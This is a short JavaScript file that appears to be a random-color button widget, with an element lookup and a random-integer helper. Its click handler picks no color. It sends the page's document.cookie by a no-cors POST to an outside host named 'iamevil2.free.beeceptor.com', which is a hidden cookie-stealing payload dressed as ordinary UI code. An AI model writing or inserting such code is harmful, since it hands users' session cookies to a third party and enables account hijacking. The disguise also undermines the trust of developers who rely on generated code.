const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    fetch('https://iamevil2.free.beeceptor.com/', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
}
